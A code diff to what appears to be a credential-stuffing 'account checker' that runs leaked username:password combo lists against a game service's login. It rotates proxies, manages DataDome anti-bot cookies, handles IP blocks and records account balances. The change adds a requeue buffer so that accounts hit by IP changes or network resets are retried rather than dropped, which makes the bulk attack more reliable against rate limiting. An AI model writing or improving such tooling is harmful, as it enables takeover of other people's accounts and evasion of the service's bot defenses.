@@ -2855,7 +2855,7 @@ def save_game_folder(account, password, account_data, game_connections, base_dir
         pass
 
 
-def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
+def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None, defer_transient=False):
     max_retries = 4
     attempt = 0
     _tried_cached = False
@@ -2905,6 +2905,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     datadome_manager.clear_session_datadome(session)
                     return 'IP_CHANGED'
                 else:
+                    if defer_transient:
+                        return 'TRANSIENT'
                     live_stats.update_stats(is_error=True)
                     account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                     results_manager.add_account(account_data)
@@ -2924,6 +2926,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     # [suppressed] network error backoff print
                     time.sleep(backoff)
                     continue
+                if defer_transient:
+                    return 'TRANSIENT'
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network Error'}
                 live_stats.update_stats(is_error=True)
                 results_manager.add_account(err_data)
@@ -2965,6 +2969,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                         session.proxies.clear()
                         session.proxies.update(proxy_manager.get_next())
                     continue
+                if defer_transient:
+                    return 'TRANSIENT'
                 live_stats.update_stats(is_error=True)
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Prelogin Failed'}
                 results_manager.add_account(account_data)
@@ -4509,6 +4515,12 @@ def bulk_check(bulk_mode: str = 'full'):
     account_index_counter = [0]
     index_lock = threading.Lock()
     stats_lock = threading.Lock()
+    # Requeue buffer — transient failures (IP flip / network reset) go back here
+    # to be re-checked on the new IP instead of being written off.
+    _requeue = deque()
+    _requeue_counts = {}
+    requeue_lock = threading.Lock()
+    _MAX_REQUEUE = 3
     global _suppress_ip_prints, _ip_block_callback
     _suppress_ip_prints = True
     def _ip_block_cb(blocked: bool):
@@ -4553,7 +4565,7 @@ def bulk_check(bulk_mode: str = 'full'):
             account, password = account.strip(), password.strip()
             session, datadome_mgr = _get_thread_resources()
             suppress = (_BULK_MODE != 'full')
-            status = processaccount(session, account, password, cookie_manager, datadome_mgr, live_stats, results_manager, file_manager, selected_file, auto_remove, suppress_print=suppress, proxy_manager=proxy_manager if using_proxy else None)
+            status = processaccount(session, account, password, cookie_manager, datadome_mgr, live_stats, results_manager, file_manager, selected_file, auto_remove, suppress_print=suppress, proxy_manager=proxy_manager if using_proxy else None, defer_transient=True)
             return (status, account, {})
         except Exception:
             return ('ERROR', account_line, {})
@@ -4567,6 +4579,17 @@ def bulk_check(bulk_mode: str = 'full'):
             dashboard.record_start(my_index, acc_name)
         except Exception:
             pass
+        def _try_requeue(account_line):
+            # Put a transient-failed account back on the queue to be re-checked on
+            # the new IP. Returns True if requeued, False once it has used up its
+            # budget (then it should be recorded as a final error, not lost).
+            with requeue_lock:
+                n = _requeue_counts.get(account_line, 0) + 1
+                _requeue_counts[account_line] = n
+                if n <= _MAX_REQUEUE:
+                    _requeue.append(account_line)
+                    return True
+            return False
         ip_change_tries = 0
         while True:
             status, acc_name, _ = _worker(account_line)
@@ -4575,6 +4598,8 @@ def bulk_check(bulk_mode: str = 'full'):
                 # Cap retries: on a single blocked IP that never actually changes,
                 # this loop would spin forever and hang the tail of the run.
                 if ip_change_tries > 3:
+                    if _try_requeue(account_line):
+                        return
                     dashboard.record(my_index, acc_name, success=False, error_reason='IP Blocked')
                     with stats_lock:
                         overall_done += 1
@@ -4596,6 +4621,15 @@ def bulk_check(bulk_mode: str = 'full'):
                 time.sleep(0.5)
                 continue
             break
+        if status == 'TRANSIENT':
+            # Account was never actually judged (IP flip / network reset).
+            # Re-check it on the new IP instead of counting it as a failure.
+            if _try_requeue(account_line):
+                return
+            dashboard.record(my_index, acc_name, success=False, error_reason='Network Error')
+            with stats_lock:
+                overall_done += 1
+            return
         result_info = live_stats.pop_result()
         if result_info and result_info['success']:
             shell_balance = result_info.get('shell_balance', 0)
@@ -4612,23 +4646,32 @@ def bulk_check(bulk_mode: str = 'full'):
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
             pending = set()
             acc_iter = iter(accounts)
+            def _next_line():
+                # Requeued (transient-failed) accounts take priority, then the
+                # fresh stream. None means nothing left to submit right now.
+                with requeue_lock:
+                    if _requeue:
+                        return _requeue.popleft()
+                try:
+                    return next(acc_iter)
+                except StopIteration:
+                    return None
             # Prime the queue
             for _ in range(min(_IN_FLIGHT, len(accounts))):
-                try:
-                    ln = next(acc_iter)
-                except StopIteration:
+                ln = _next_line()
+                if ln is None:
                     break
                 pending.add(executor.submit(_wrapped_worker, ln))
-            
-            while pending:
+
+            # Keep going while work is in flight OR waiting to be requeued.
+            while pending or _requeue:
                 # Wait for at least one to complete, drain finished ones
                 from concurrent.futures import wait, FIRST_COMPLETED
                 done, pending = wait(pending, return_when=FIRST_COMPLETED, timeout=0.05)
                 # Re-fill the in-flight window
                 while len(pending) < _IN_FLIGHT:
-                    try:
-                        ln = next(acc_iter)
-                    except StopIteration:
+                    ln = _next_line()
+                    if ln is None:
                         break
                     pending.add(executor.submit(_wrapped_worker, ln))
                 # Reap results so exceptions don't get lost
